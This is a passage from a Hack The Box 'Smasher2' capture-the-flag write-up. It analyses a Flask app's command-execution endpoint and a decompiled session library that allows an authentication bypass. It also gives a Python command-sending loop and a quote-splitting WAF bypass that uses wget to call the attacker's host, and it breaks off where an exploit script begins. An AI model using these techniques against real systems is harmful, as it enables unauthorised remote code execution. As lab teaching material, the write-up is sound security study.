100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]  18.17K  85.2KB&#x2F;s    in 0.2s    </span><br><span class="line"></span><br><span class="line">2019-12-13 07:40:44 (85.2 KB&#x2F;s) - ‘ses.so’ saved [18608&#x2F;18608]</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2&#x2F;backup#</span><br></pre></td></tr></table></figure><p>By looking at <code>auth.py</code> I knew that these files were related to <code>wonderfulsessionmanager.smasher2.htb</code>.</p><h2 id="auth-py-Analysis"><a href="#auth-py-Analysis" class="headerlink" title="auth.py: Analysis"></a>auth.py: Analysis</h2><p><code>auth.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> ses</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> session,redirect, url_for, request,render_template, jsonify,Flask, send_from_directory</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_secure_key</span><span class="params">()</span>:</span></span><br><span class="line">    m = hashlib.sha1()</span><br><span class="line">    m.update(os.urandom(<span class="number">32</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">craft_secure_token</span><span class="params">(content)</span>:</span></span><br><span class="line">    h = hmac.new(<span class="string">"HMACSecureKey123!"</span>, base64.b64encode(content).encode(), hashlib.sha256)</span><br><span class="line">    <span class="keyword">return</span> h.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lock = Lock()</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = get_secure_key()</span><br><span class="line">Managers = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_creds</span><span class="params">(ip, c)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"creds.log"</span>, <span class="string">"a"</span>) <span class="keyword">as</span> creds:</span><br><span class="line">        creds.write(<span class="string">"Login from &#123;&#125; with data &#123;&#125;:&#123;&#125;\n"</span>.format(ip, c[<span class="string">"username"</span>], c[<span class="string">"password"</span>]))</span><br><span class="line">        creds.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_get_manager</span><span class="params">(id)</span>:</span></span><br><span class="line">    lock.acquire()</span><br><span class="line">    manager = Managers[id]</span><br><span class="line">    lock.release()</span><br><span class="line">    <span class="keyword">return</span> manager</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_init_manager</span><span class="params">(id)</span>:</span></span><br><span class="line">    lock.acquire()</span><br><span class="line">    <span class="keyword">if</span> id <span class="keyword">in</span> Managers:</span><br><span class="line">        <span class="keyword">del</span> Managers[id]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">            login = [<span class="string">"&lt;REDACTED&gt;"</span>, <span class="string">"&lt;REDACTED&gt;"</span>]</span><br><span class="line">            Managers.update(&#123;id: ses.SessionManager(login, craft_secure_token(<span class="string">":"</span>.join(login)))&#125;)</span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_have_manager</span><span class="params">(id)</span>:</span></span><br><span class="line">    ret = <span class="literal">False</span></span><br><span class="line">    lock.acquire()</span><br><span class="line">    ret = id <span class="keyword">in</span> Managers</span><br><span class="line">    lock.release()</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.path == <span class="string">"/"</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session.has_key(<span class="string">"id"</span>):</span><br><span class="line">            k = get_secure_key()</span><br><span class="line">            safe_init_manager(k)</span><br><span class="line">            session[<span class="string">"id"</span>] = k</span><br><span class="line">        <span class="keyword">elif</span> session.has_key(<span class="string">"id"</span>) <span class="keyword">and</span> <span class="keyword">not</span> safe_have_manager(session[<span class="string">"id"</span>]):</span><br><span class="line">            <span class="keyword">del</span> session[<span class="string">"id"</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">"/"</span>, <span class="number">302</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.has_key(<span class="string">"id"</span>) <span class="keyword">and</span> safe_have_manager(session[<span class="string">"id"</span>]):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">"/"</span>, <span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">after_request</span><span class="params">(resp)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/assets/&lt;path:filename&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base_static</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.root_path + <span class="string">'/assets/'</span>, filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"login.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/auth', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    ret = &#123;<span class="string">"authenticated"</span>: <span class="literal">None</span>, <span class="string">"result"</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    manager = safe_get_manager(session[<span class="string">"id"</span>])</span><br><span class="line">    data = request.get_json(silent=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            tmp_login = dict(data[<span class="string">"data"</span>])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        tmp_user_login = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            is_logged = manager.check_login(data)</span><br><span class="line">            secret_token_info = [<span class="string">"/api/&lt;api_key&gt;/job"</span>, manager.secret_key, int(time.time())]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                tmp_user_login = &#123;<span class="string">"username"</span>: tmp_login[<span class="string">"username"</span>], <span class="string">"password"</span>: tmp_login[<span class="string">"password"</span>]&#125;</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> is_logged[<span class="number">0</span>]:</span><br><span class="line">                ret[<span class="string">"authenticated"</span>] = <span class="literal">False</span></span><br><span class="line">                ret[<span class="string">"result"</span>] = <span class="string">"Cannot authenticate with data: %s - %s"</span> % (is_logged[<span class="number">1</span>], <span class="string">"Too many tentatives, wait 2 minutes!"</span> <span class="keyword">if</span> manager.blocked <span class="keyword">else</span> <span class="string">"Try again!"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> tmp_user_login <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    log_creds(request.remote_addr, tmp_user_login)</span><br><span class="line">                ret[<span class="string">"authenticated"</span>] = <span class="literal">True</span></span><br><span class="line">                ret[<span class="string">"result"</span>] = &#123;<span class="string">"endpoint"</span>: secret_token_info[<span class="number">0</span>], <span class="string">"key"</span>: secret_token_info[<span class="number">1</span>], <span class="string">"creation_date"</span>: secret_token_info[<span class="number">2</span>]&#125;</span><br><span class="line">        <span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">            ret[<span class="string">"authenticated"</span>] = <span class="literal">False</span></span><br><span class="line">            ret[<span class="string">"result"</span>] = str(e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret[<span class="string">"authenticated"</span>] = <span class="literal">False</span></span><br><span class="line">        ret[<span class="string">"result"</span>] = <span class="string">"Cannot authenticate missing parameters."</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/api/&lt;key&gt;/job", methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(key)</span>:</span></span><br><span class="line">    ret = &#123;<span class="string">"success"</span>: <span class="literal">None</span>, <span class="string">"result"</span>: <span class="literal">None</span>&#125;</span><br><span class="line">    manager = safe_get_manager(session[<span class="string">"id"</span>])</span><br><span class="line">    <span class="keyword">if</span> manager.secret_key == key:</span><br><span class="line">        data = request.get_json(silent=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">and</span> type(data) == dict:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"schedule"</span> <span class="keyword">in</span> data:</span><br><span class="line">                out = subprocess.check_output([<span class="string">'bash'</span>, <span class="string">'-c'</span>, data[<span class="string">"schedule"</span>]])</span><br><span class="line">                ret[<span class="string">"success"</span>] = <span class="literal">True</span></span><br><span class="line">                ret[<span class="string">"result"</span>] = out</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ret[<span class="string">"success"</span>] = <span class="literal">False</span></span><br><span class="line">                ret[<span class="string">"result"</span>] = <span class="string">"Missing schedule parameter."</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret[<span class="string">"success"</span>] = <span class="literal">False</span></span><br><span class="line">            ret[<span class="string">"result"</span>] = <span class="string">"Invalid value provided."</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret[<span class="string">"success"</span>] = <span class="literal">False</span></span><br><span class="line">        ret[<span class="string">"result"</span>] = <span class="string">"Invalid token."</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>I read the code and these are the things that interest us:<br>After successful authentication the server will respond with a secret key that we can use to access the endpoint <code>/api/&lt;key&gt;/job</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret[<span class="string">"authenticated"</span>] = <span class="literal">True</span></span><br><span class="line">ret[<span class="string">"result"</span>] = &#123;<span class="string">"endpoint"</span>: secret_token_info[<span class="number">0</span>], <span class="string">"key"</span>: secret_token_info[<span class="number">1</span>], <span class="string">"creation_date"</span>: secret_token_info[<span class="number">2</span>]&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret_token_info = [<span class="string">"/api/&lt;api_key&gt;/job"</span>, manager.secret_key, int(time.time())]</span><br></pre></td></tr></table></figure><p>That endpoint only accepts <code>POST</code> requests:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/api/&lt;key&gt;/job", methods=['POST'])</span></span><br></pre></td></tr></table></figure><p>And the sent data has to be <code>json</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data = request.get_json(silent=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">if</span> data <span class="keyword">and</span> type(data) == dict:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>Through that endpoint we can execute system commands by providing them in a parameter called <code>schedule</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">"schedule"</span> <span class="keyword">in</span> data:</span><br><span class="line">    out = subprocess.check_output([<span class="string">'bash'</span>, <span class="string">'-c'</span>, data[<span class="string">"schedule"</span>]])</span><br><span class="line">    ret[<span class="string">"success"</span>] = <span class="literal">True</span></span><br><span class="line">    ret[<span class="string">"result"</span>] = out</span><br></pre></td></tr></table></figure><h2 id="session-so-Analysis-–-gt-Authentication-Bypass"><a href="#session-so-Analysis-–-gt-Authentication-Bypass" class="headerlink" title="session.so: Analysis –&gt; Authentication Bypass"></a>session.so: Analysis –&gt; Authentication Bypass</h2><p><code>session.so</code> is a compiled shared python library, <code>so</code> stands for shared object:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2&#x2F;backup# file ses.so </span><br><span class="line">ses.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]&#x3D;0c67d40b77854318b10417b4aedfee95a52f0550, not stripped</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2&#x2F;backup#</span><br></pre></td></tr></table></figure><p>I opened it in <code>ghidra</code> and started checking the functions. Two functions caught my attention, <code>get_internal_pwd()</code> and <code>get_internal_usr()</code>:<br><img src="/images/hackthebox/smasher2/7.png" alt=""><br>I looked at the decompiled code of both of them and noticed something strange, they were the exact same:<br><code>get_internal_pwd()</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">get_internal_pwd</span><span class="params">(undefined8 param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> *plVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  </span><br><span class="line">  plVar1 = (<span class="keyword">long</span> *)PyObject_GetAttrString(param_1,<span class="string">"user_login"</span>);</span><br><span class="line">  uVar2 = PyList_GetItem(plVar1,<span class="number">0</span>);</span><br><span class="line">  uVar2 = PyString_AsString(uVar2);</span><br><span class="line">  *plVar1 = *plVar1 + <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> (*plVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    (**(code **)(plVar1[<span class="number">1</span>] + <span class="number">0x30</span>))(plVar1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>get_internal_usr()</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">get_internal_usr</span><span class="params">(undefined8 param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> *plVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  </span><br><span class="line">  plVar1 = (<span class="keyword">long</span> *)PyObject_GetAttrString(param_1,<span class="string">"user_login"</span>);</span><br><span class="line">  uVar2 = PyList_GetItem(plVar1,<span class="number">0</span>);</span><br><span class="line">  uVar2 = PyString_AsString(uVar2);</span><br><span class="line">  *plVar1 = *plVar1 + <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> (*plVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    (**(code **)(plVar1[<span class="number">1</span>] + <span class="number">0x30</span>))(plVar1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/smasher2/backup<span class="meta"># diff getinternalusr getinternalpwd </span></span><br><span class="line"><span class="number">1</span>c1</span><br><span class="line">&lt; <span class="function">undefined8 <span class="title">get_internal_usr</span><span class="params">(undefined8 param_1)</span></span></span><br><span class="line">---</span><br><span class="line">&gt; <span class="function">undefined8 <span class="title">get_internal_pwd</span><span class="params">(undefined8 param_1)</span></span></span><br><span class="line">root@kali:~/Desktop/HTB/boxes/smasher2/backup#</span><br></pre></td></tr></table></figure><p>So in theory, since the two function are identical, providing the username as a password should work. Which means that it’s just a matter of finding an existing username and we’ll be able to bypass the authentication.<br>I tried some common usernames before attempting to use <code>wfuzz</code>, <code>Administrator</code> worked:<br><img src="/images/hackthebox/smasher2/8.png" alt=""></p><p><img src="/images/hackthebox/smasher2/9.png" alt=""></p><h2 id="WAF-Bypass-–-gt-RCE-–-gt-Shell-as-dzonerzy-–-gt-Root-Flag"><a href="#WAF-Bypass-–-gt-RCE-–-gt-Shell-as-dzonerzy-–-gt-Root-Flag" class="headerlink" title="WAF Bypass –&gt; RCE –&gt; Shell as dzonerzy –&gt; Root Flag"></a>WAF Bypass –&gt; RCE –&gt; Shell as dzonerzy –&gt; Root Flag</h2><p>I wrote a small script to execute commands through <code>/api/&lt;key&gt;/job</code> as we saw earlier in <code>auth.py</code>, the script was meant for testing purposes:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">"session"</span>:<span class="string">"eyJpZCI6eyIgYiI6Ik16UXpNakpoTVRVeVlqaGlNekJsWVdSbU9HTXlPV1kzTmprMk1XSTROV00xWkdVME5HTmxNQT09In19.XfNxUQ.MznJKgs2isklCZxfV4G0IjEPcvg"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">cmd = input(<span class="string">"cmd: "</span>)</span><br><span class="line">req = post(<span class="string">"http://wonderfulsessionmanager.smasher2.htb/api/fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8/job"</span>, json=&#123;<span class="string">"schedule"</span>:cmd&#125;, cookies=cookies)</span><br><span class="line">response = req.text</span><br><span class="line">print(response)</span><br></pre></td></tr></table></figure><p>Testing with <code>whoami</code> worked just fine:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;smasher2# .&#x2F;test.py </span><br><span class="line">cmd: whoami</span><br><span class="line">&#123;&quot;result&quot;:&quot;dzonerzy\n&quot;,&quot;success&quot;:true&#125;</span><br><span class="line"></span><br><span class="line">cmd:</span><br></pre></td></tr></table></figure><p>However when I tried other commands I got a <code>403</code> response indicating that the server was protected by a <code>WAF</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cmd: curl http:&#x2F;&#x2F;10.10.xx.xx</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Forbidden&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;You don&#39;t have permission to access &#x2F;api&#x2F;fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8&#x2F;job</span><br><span class="line">on this server.&lt;br &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;address&gt;Apache&#x2F;2.4.29 (Ubuntu) Server at wonderfulsessionmanager.smasher2.htb Port 80&lt;&#x2F;address&gt;</span><br><span class="line">&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">cmd:</span><br></pre></td></tr></table></figure><p>I could easily bypass it by inserting single quotes in the command:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmd: &#39;w&#39;g&#39;e&#39;t &#39;h&#39;t&#39;t&#39;p&#39;:&#39;&#x2F;&#39;&#x2F;&#39;1&#39;0&#39;.&#39;1&#39;0&#39;.&#39;x&#39;x&#39;.&#39;x&#39;x&#39;&#x2F;&#39;t&#39;e&#39;s&#39;t&#39;</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 3.2 Final&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;title&gt;500 Internal Server Error&lt;&#x2F;title&gt;</span><br><span class="line">&lt;h1&gt;Internal Server Error&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;p&gt;The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">cmd:</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.135 - - [13&#x2F;Dec&#x2F;2019 08:18:33] code 404, message File not found</span><br><span class="line">10.10.10.135 - - [13&#x2F;Dec&#x2F;2019 08:18:33] &quot;GET &#x2F;test HTTP&#x2F;1.1&quot; 404 -</span><br></pre></td></tr></table></figure><p>To automate the exploitation process I wrote this small exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 